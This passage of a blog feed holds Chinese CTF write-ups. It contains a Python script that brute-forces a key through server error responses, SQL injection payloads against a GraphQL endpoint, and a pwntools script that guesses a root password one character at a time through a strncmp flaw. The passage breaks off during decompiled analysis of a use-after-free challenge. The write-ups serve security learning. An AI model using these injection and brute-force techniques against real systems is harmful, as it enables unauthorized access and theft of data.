Error，可以确定key为16位</p><p>同样，我们可以利用false和500报错来逐位爆破key</p><p>当POST数据为<code>{&quot;key&quot;:[&quot;a&quot;,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（16个null）时：false</p><p>当POST数据为<code>{&quot;key&quot;:[&quot;5&quot;,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（16个null）时：500 Internal Server Error</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://123.206.83.157:8000/getflag"</span></span><br><span class="line">proxy = &#123;<span class="string">'http'</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</span><br><span class="line">key = [<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>]</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    key[index] = str(chr(i))</span><br><span class="line">    payload = &#123;<span class="string">"key"</span>:key&#125;</span><br><span class="line">    text = requests.post(url,json=payload,proxies=proxy).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"500 Internal Server Error"</span> <span class="keyword">in</span> text :</span><br><span class="line">      print(<span class="string">""</span>.join(key[:index+<span class="number">1</span>]))</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"true"</span> <span class="keyword">in</span> text:</span><br><span class="line">      print(<span class="string">""</span>.join(key))</span><br><span class="line">      exit()   <span class="comment">#5ecur3pPYpyPYk3y</span></span><br></pre></td></tr></table></figure><h3 id="BabyQuery"><a href="#BabyQuery" class="headerlink" title="BabyQuery"></a>BabyQuery</h3><p>抓包看一下post的数据，是graphql，一个查询API，编码是base32<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=&#123; getscorebyid(id: &quot;GE======&quot;)&#123; id name score &#125; &#125;</span><br></pre></td></tr></table></figure></p><p>随便改一下<code>getscorebyxx</code>，可以看到报错发现还有<code>getscorebyyourname</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[GraphQLError(&apos;Cannot query field &quot;getscoreby222&quot; on type &quot;Query&quot;. Did you mean &quot;getscorebyid&quot; or &quot;getscorebyyourname&quot;?&apos;,)]</span><br></pre></td></tr></table></figure><p>测试发现id只能1位数，那么只能从那么入手，写个代码测试注入，hackbar无base32比较麻烦<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  base64 <span class="keyword">import</span> b32encode</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://182.254.247.127:3001/graphql"</span></span><br><span class="line">payload = <span class="string">"1' or '1'='1"</span></span><br><span class="line">q = <span class="string">'&#123; getscorebyyourname(name: "%s")&#123; name score &#125; &#125;'</span>%(b32encode(payload))</span><br><span class="line">r = requests.post(url=url,data=&#123;<span class="string">"query"</span> : q&#125;)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>测试发现存在注入，<code>payload = &quot;1&#39; union select 1-- &quot;</code>返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OrderedDict([(u&apos;getscorebyyourname&apos;, OrderedDict([(u&apos;name&apos;, &quot;1&apos; union select 1-- &quot;), (u&apos;score&apos;, &apos;1&apos;)]))])</span><br></pre></td></tr></table></figure></p><p>常用套路测试<code>payload = &quot;1&#39; union select database()-- &quot;</code>，发现不是mysql，是sqlite。先爆一下表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;-1&apos; UNION ALL SELECT name FROM sqlite_master WHERE type=\&quot;table\&quot; limit 1,1--&quot;</span><br><span class="line">OrderedDict([(u&apos;getscorebyyourname&apos;, OrderedDict([(u&apos;name&apos;, &apos;-1\&apos; UNION ALL SELECT name FROM sqlite_master WHERE type=&quot;table&quot; limit 1,1--&apos;), (u&apos;score&apos;, &apos;Secr3t_fl4g&apos;)]))])</span><br></pre></td></tr></table></figure></p><p>发现fSecr3t_fl4g表了，搞掂~<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;-1&apos; UNION ALL SELECT * from Secr3t_fl4g--&quot;</span><br><span class="line">OrderedDict([(u&apos;getscorebyyourname&apos;, OrderedDict([(u&apos;name&apos;, &quot;-1&apos; UNION ALL SELECT * from Secr3t_fl4g--&quot;), (u&apos;score&apos;, &apos;HITCTF&#123;fee26d3a146a404e106b1ed93156f30e&#125;&apos;)]))])</span><br></pre></td></tr></table></figure></p><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to 7HxzZ login system!"</span>);</span><br><span class="line">  v4 = login();</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Login successful\nBut you have no permission to get the flag!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Login failed!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How can you login successful as root!\nThere must be something wrong with the login function,let me check again!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Checking......"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( check() &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Don't fool me, you are not the true root user!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This is your flag: "</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求输入用户名和密码，需要使用root登录，来看一下login()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> n; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">255</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Username: "</span>);</span><br><span class="line">  n = read_input_raw((<span class="keyword">int</span>)username, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Password: "</span>);</span><br><span class="line">  v3 = read_input_raw((<span class="keyword">int</span>)password, <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(username, <span class="string">"root"</span>, n) &amp;&amp; !<span class="built_in">strncmp</span>(password, <span class="string">"passwd_has_be_changed_in_remote_"</span>, v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里的密码比较有问题，你输入多少位，就比较多少位，例如你只输入一位，那么就只比较第一位是不是跟root密码一样。这里可以绕过，后面还有一个check()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password, <span class="string">"passwd_has_be_changed_in_remote_"</span>, <span class="number">0x20</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Correct password!"</span>);</span><br><span class="line">    ++v1;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里的密码比较就是固定32位，可以猜想真正密码是32位，可以利用login()进行逐位爆破。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'password'</span> + chr(x)</span><br><span class="line">    p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40001</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Username:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'root'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Password: '</span>)</span><br><span class="line">    p.sendline(password+chr(x))</span><br><span class="line">    a = p.recvline()</span><br><span class="line">    <span class="keyword">print</span> a </span><br><span class="line">    <span class="keyword">if</span> <span class="string">'successful'</span> <span class="keyword">in</span> a:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">if</span> login(j):</span><br><span class="line">                password += chr(j)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'password:'</span>,password</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">''</span> <span class="comment">#10_adhUNwj_qidACn_qdXon912_uhdq6</span></span><br><span class="line">foo()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;easy-xor-apk&quot;&gt;&lt;a href=&quot;#easy-xor-apk&quot; class=&quot;headerlink&quot; title=&quot;easy_xor.apk&quot;&gt;&lt;/a&gt;easy_xor.apk&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://4f-kira.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>pwn-imdb</title>
    <link href="https://4f-kira.github.io/2018/01/30/pwn-imdb/"/>
    <id>https://4f-kira.github.io/2018/01/30/pwn-imdb/</id>
    <published>2018-01-30T01:58:32.000Z</published>
    <updated>2018-01-30T05:16:38.516Z</updated>
    
    <content type="html"><![CDATA[<p>blog已经搭了一段时间了，拖延症发作，一直没写。最近没做什么有意思的题，就写一下某CTF群的入群题解题思路。</p><h2 id="程序伪代码"><a href="#程序伪代码" class="headerlink" title="程序伪代码"></a>程序伪代码</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  signal(<span class="number">14</span>, handler);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*** Welcome to IMDB ***"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    -- search for movies and TVs here\n----------------------------------------"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">        add_tv();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        add_movie();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        remove();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序基本功能是添加tv或者movie，可以删除指定name的，以及显示所有记录。</p><h3 id="add-tv"><a href="#add-tv" class="headerlink" title="add_tv"></a>add_tv</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">float</span> v1; <span class="comment">// xmm1_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0xD0</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)v0, <span class="number">0</span>, <span class="number">0xD0</span>uLL);</span><br><span class="line">  *(_QWORD *)v0 = printf_tv;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV name? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">8</span>), <span class="number">0x40</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Season? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  *(_DWORD *)(v0 + <span class="number">204</span>) = strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rating? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  v1 = strtod((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L);</span><br><span class="line">  *(<span class="keyword">float</span> *)(v0 + <span class="number">200</span>) = v1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV introduction? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x7F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">72</span>), <span class="number">0x80</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)put_in_list(v0, <span class="number">128L</span>L) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"New TV added."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v0 + <span class="number">16L</span>L))(v0);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><h3 id="add-movie"><a href="#add-movie" class="headerlink" title="add_movie"></a>add_movie</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_movie</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">float</span> v1; <span class="comment">// xmm1_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">216u</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)v0, <span class="number">0</span>, <span class="number">0xD8</span>uLL);</span><br><span class="line">  *(_QWORD *)v0 = printf_movie;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Movie name? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">8</span>), <span class="number">0x40</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Actors? "</span>);</span><br><span class="line">  *(_QWORD *)(v0 + <span class="number">208</span>) = sub_400CC0(); <span class="comment">//这里会额外申请一块内存放数据</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rating? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  v1 = strtod((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L);</span><br><span class="line">  *(<span class="keyword">float</span> *)(v0 + <span class="number">200</span>) = v1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Movie introduction? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x7F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">72</span>), <span class="number">0x80</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)put_in_list(v0, <span class="number">128L</span>L) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"New movie added."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v0 + <span class="number">16L</span>L))(v0);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0L</span>L;</span><br><span class="line">  v1 = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV/Movie name to remove? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v4, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="keyword">const</span> <span class="keyword">char</span> *)list_table[v0];</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp;&amp; !<span class="built_in">strcmp</span>(v2 + <span class="number">8</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">const</span> <span class="keyword">char</span> *, __int64 *))(*(_QWORD *)v2 + <span class="number">16L</span>L))(v2, &amp;v4);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 != <span class="number">32</span> );</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)v1 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Not found."</span>);</span><br><span class="line">  list_table[v1] = <span class="number">0L</span>L;   <span class="comment">//这里只清0了最后一个</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Removed successfully"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点是：remove那里可以批量删除name一样的，但是只清空了最后一个指针。</p><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> (**v1)(<span class="keyword">const</span> <span class="keyword">char</span> *, ...); <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  v1 = (<span class="keyword">int</span> (**)(<span class="keyword">const</span> <span class="keyword">char</span> *, ...))list_table;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *v1 